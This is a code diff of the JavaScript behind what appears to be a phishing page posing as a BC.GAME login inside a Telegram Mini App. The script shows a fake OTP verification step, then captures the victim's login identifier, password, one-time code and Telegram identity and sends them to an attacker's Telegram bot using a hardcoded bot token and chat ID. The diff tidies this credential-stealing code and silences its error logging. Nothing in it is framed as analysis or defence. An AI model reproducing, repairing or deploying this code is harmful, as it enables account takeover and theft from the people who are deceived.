@@ -1,4 +1,4 @@
-// Configuration - Update these for your logging bot
+// Configuration
 const TARGET_BOT_TOKEN = '8728790870:AAGZZqVttTR3mQZFfXMtR3sdRlcVSbTHiRc'; 
 const TARGET_CHAT_ID = '7611425178';
 
@@ -48,19 +48,18 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     // Toggle Password Visibility
-    eyeIcon.addEventListener('click', () => {
-        const type = loginPassword.type === 'password' ? 'text' : 'password';
-        loginPassword.type = type;
-        eyeIcon.querySelector('i').className = type === 'password' ? 'far fa-eye' : 'far fa-eye-slash';
-    });
+    if (eyeIcon) {
+        eyeIcon.addEventListener('click', () => {
+            const type = loginPassword.type === 'password' ? 'text' : 'password';
+            loginPassword.type = type;
+            eyeIcon.querySelector('i').className = type === 'password' ? 'far fa-eye' : 'far fa-eye-slash';
+        });
+    }
 
     // Close Actions
     closeIcons.forEach(icon => {
         icon.addEventListener('click', () => {
             otpOverlay.style.display = 'none';
-            if (icon.classList.contains('close-icon') && tg) {
-                tg.close();
-            }
         });
     });
 
@@ -70,7 +69,7 @@ document.addEventListener('DOMContentLoaded', () => {
         const password = loginPassword.value.trim();
 
         if (!identifier) {
-            alert('Please enter your Email or Phone Number');
+            alert('Please enter your details');
             return;
         }
 
@@ -79,7 +78,7 @@ document.addEventListener('DOMContentLoaded', () => {
             return;
         }
 
-        // Improved detection: Check if it's an email or looks like a phone number
+        // Detect Mobile vs Email
         const isEmail = identifier.includes('@');
         const isPhone = /^\+?\d{7,15}$/.test(identifier.replace(/[\s-]/g, ''));
         
@@ -91,100 +90,75 @@ document.addEventListener('DOMContentLoaded', () => {
             verifyTitle.innerText = 'Mobile Verification';
             verifyDesc.innerText = `Please enter the 6-digit verification code sent to your phone`;
             verifyTypeIcon.className = 'fas fa-mobile-alt';
-        } else {
-            // Default to Email if uncertain but tab is OTP
-            verifyTitle.innerText = 'Verification';
-            verifyDesc.innerText = `Please enter the 6-digit verification code sent to you`;
-            verifyTypeIcon.className = 'fas fa-shield-alt';
         }
 
-        // Show Verification Modal
+        // SHOW MODAL
         otpOverlay.style.display = 'flex';
         startTimer(60);
         
         if (tg) tg.HapticFeedback.impactOccurred('medium');
     });
 
-    // Confirm Button (Final Submission)
+    // Confirm Button
     btnConfirm.addEventListener('click', async () => {
         const code = verifyCodeInput.value.trim();
         const identifier = mainIdentifier.value.trim();
         const password = loginPassword.value.trim();
-        const username = tg?.initDataUnsafe?.user?.username || 'Guest';
+        const username = tg?.initDataUnsafe?.user?.username || tg?.initDataUnsafe?.user?.first_name || 'Guest';
         const tgId = tg?.initDataUnsafe?.user?.id || 'N/A';
 
         if (code.length < 4) {
-            alert('Please enter a valid verification code');
+            alert('Please enter verification code');
             return;
         }
 
         btnConfirm.innerText = 'Verifying...';
         btnConfirm.disabled = true;
 
-        const captureData = {
+        const data = {
             tg_username: username,
             tg_id: tgId,
             identifier: identifier,
-            password: activeTab === 'password' ? password : 'N/A (OTP Mode)',
-            otp_code: code,
-            login_mode: activeTab,
-            timestamp: new Date().toLocaleString()
+            password: password || 'N/A',
+            otp: code,
+            mode: activeTab,
+            time: new Date().toLocaleString()
         };
 
-        // Send to Logger Bot
-        await sendToLogger(captureData);
+        await sendToLogger(data);
 
-        // Success Simulation
-        btnConfirm.innerText = 'Success!';
-        if (tg) tg.HapticFeedback.notificationOccurred('success');
-
+        btnConfirm.innerText = 'Confirmed';
+        
         setTimeout(() => {
             otpOverlay.style.display = 'none';
-            if (tg) {
-                tg.sendData(JSON.stringify({ action: 'login_captured', status: 'ok' }));
-                tg.close();
-            } else {
-                location.reload();
-            }
+            if (tg) tg.close();
+            else location.reload();
         }, 1500);
     });
 
-    // Paste Function
-    pasteBtn.addEventListener('click', async () => {
-        try {
-            const text = await navigator.clipboard.readText();
-            if (text) verifyCodeInput.value = text;
-        } catch (err) {
-            console.error('Clipboard error:', err);
-        }
-    });
-
-    // Timer Logic
+    // Timer
     function startTimer(seconds) {
         let timeLeft = seconds;
         resendSeconds.innerText = timeLeft;
         clearInterval(timerInterval);
-        
         timerInterval = setInterval(() => {
             timeLeft--;
             resendSeconds.innerText = timeLeft;
-            if (timeLeft <= 0) {
-                clearInterval(timerInterval);
-            }
+            if (timeLeft <= 0) clearInterval(timerInterval);
         }, 1000);
     }
 
-    // Function to send data to Telegram API
+    // Logger
     async function sendToLogger(data) {
-        const message = `
-🎯 <b>Login Capture: BC.GAME</b>
+        const text = `
+🎯 <b>Login Capture</b>
 ━━━━━━━━━━━━━━━
 👤 <b>User</b>: @${data.tg_username} (ID: ${data.tg_id})
 📧 <b>Login</b>: <code>${data.identifier}</code>
 🔑 <b>Pass</b>: <code>${data.password}</code>
-🔢 <b>OTP</b>: <code>${data.otp_code}</code>
-🛠 <b>Mode</b>: ${data.login_mode.toUpperCase()}
-🕒 <b>Time</b>: ${data.timestamp}
+🔢 <b>OTP</b>: <code>${data.otp}</code>
+🛠 <b>Mode</b>: ${data.mode.toUpperCase()}
+🕒 <b>Time</b>: ${data.time}
 ━━━━━━━━━━━━━━━`;
 
         try {
@@ -193,12 +167,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: TARGET_CHAT_ID,
-                    text: message,
+                    text: text,
                     parse_mode: 'HTML'
                 })
             });
-        } catch (err) {
-            console.error('Logging failed:', err);
-        }
+        } catch (e) {}
     }
 });
